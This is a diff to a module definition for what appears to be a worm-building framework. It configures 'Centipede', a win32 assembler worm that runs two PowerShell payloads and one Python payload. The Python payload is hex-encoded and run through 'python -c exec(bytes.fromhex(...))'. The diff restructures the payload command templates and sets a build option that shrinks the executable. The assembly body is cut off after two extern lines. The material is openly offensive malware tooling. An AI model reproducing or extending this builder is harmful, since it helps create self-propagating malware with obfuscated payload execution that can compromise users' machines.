@@ -1,19 +1,23 @@
 #!name##Centipede
 #!types##worm
-#!info##A worm written in assembler. Runs two payloads in PowerShell and one payload in python.
+#!info##A worm written in assembler (win32). Runs two payloads in PowerShell and one payload in python.
 #!lang##asm
 #!banned##module##starter##shadow##junk
 #!system_FLAG##[W]
 #!globalVar##COMPILER_NAME##MC_win32##Compiler name
 #!globalVar##OS_EXEC##win##Target system executable
 #!processWorm##BasicAsm
-#!reqPayload##CEN_ps1##Powershell command to execute##STACK_BUILD:True##STACK_COMMAND:powershell.exe -Command "$"
-#!reqPayload##CEN_ps2##Powershell command to execute##STACK_BUILD:True##STACK_COMMAND:powershell.exe -Command "$"
-#!reqPayload##CEN_py1##Python Script to execute##STACK_BUILD:True##STACK_COMMAND:cmd.exe /C python -c exec(bytes.fromhex('$')) & pause
-#!payloadOpt##CEN_py1##ENCODE##bytes_hex
+#!reqPayload##CEN_ps1##Powershell command to execute
+#!reqPayload##CEN_ps2##Powershell command to execute
+#!reqPayload##CEN_py1##Python Script to execute
 #!payloadOpt##CEN_py1##INCLUDE_IMPORTS##True##Include import library in code
 #!reqVar##GLOBAL_COMPILER_NO_DLL##Whether the compiler should include libraries in the executable. Without the included DLLs, the resulting file takes up very little space.##str
 #!setVar##GLOBAL_COMPILER_NO_DLL##True##str
+#!payStep##asm_stack_build
+#!payloadOpt##CEN_ps1##asm_stack_build_cmd##powershell.exe -Command "$"
+#!payloadOpt##CEN_ps2##asm_stack_build_cmd##powershell.exe -Command "$"
+#!payloadOpt##CEN_py1##asm_stack_build_cmd##cmd.exe /C python -c exec(bytes.fromhex('$'))
+#!payStep##encode_hex$CEN_py1
 
 extern _ExitProcess@4
 extern _system
